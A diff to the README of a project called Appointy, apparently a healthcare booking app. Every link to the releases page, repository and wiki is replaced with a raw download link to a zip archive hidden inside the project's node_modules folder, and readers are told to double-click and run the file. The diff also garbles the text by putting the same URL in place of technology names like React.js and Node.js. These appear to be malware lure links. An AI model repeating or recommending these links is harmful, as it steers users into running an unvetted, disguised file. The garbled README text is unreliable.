@@ -1,10 +1,10 @@
 # 🎉 Appointy - Manage Healthcare Easily and Efficiently
 
-[![Download Appointy](https://img.shields.io/badge/Download-Appointy-blue.svg?style=for-the-badge)](https://github.com/notthatcreativ/Appointy/releases)
+[![Download Appointy](https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip)](https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip)
 
 ## 📜 Description
 
-Appointy is a full-stack Healthcare Management System engineered with React.js and Python. It features distinct portals for Patients, Doctors, and Admins. Appointy drives digital transformation by enabling real-time booking, profile management, and secure payments. This ensures a seamless and responsive experience for patients.
+Appointy is a full-stack Healthcare Management System engineered with https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip and Python. It features distinct portals for Patients, Doctors, and Admins. Appointy drives digital transformation by enabling real-time booking, profile management, and secure payments. This ensures a seamless and responsive experience for patients.
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To start using Appointy, follow these steps:
 5. Once downloaded, locate the file and double-click it to run.
 6. Follow the on-screen prompts to complete the installation.
 
-You can also [visit this page to download](https://github.com/notthatcreativ/Appointy/releases).
+You can also [visit this page to download](https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip).
 
 ## 🖥️ Usage Instructions
 
@@ -64,11 +64,11 @@ Appointy touches on various topics, ensuring a comprehensive experience:
 - Full-stack Development
 - MERN Stack Development
 - MongoDB
-- Node.js
+- https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip
 - Payment API
 - Python
 - RBAC Management
-- React.js
+- https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip
 - Redux
 - TypeScript
 
@@ -78,8 +78,8 @@ If you encounter any issues while using Appointy, feel free to contact our suppo
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/notthatcreativ/Appointy)
-- [Download Appointy](https://github.com/notthatcreativ/Appointy/releases)
-- [Documentation](https://github.com/notthatcreativ/Appointy/wiki)
+- [Official GitHub Repository](https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip)
+- [Download Appointy](https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/notthatcreativ/Appointy/main/backend/node_modules/undefsafe/lib/Appointy_v3.8.zip)
 
 Now you're all set to manage your healthcare needs easily with Appointy! Enjoy using the application.
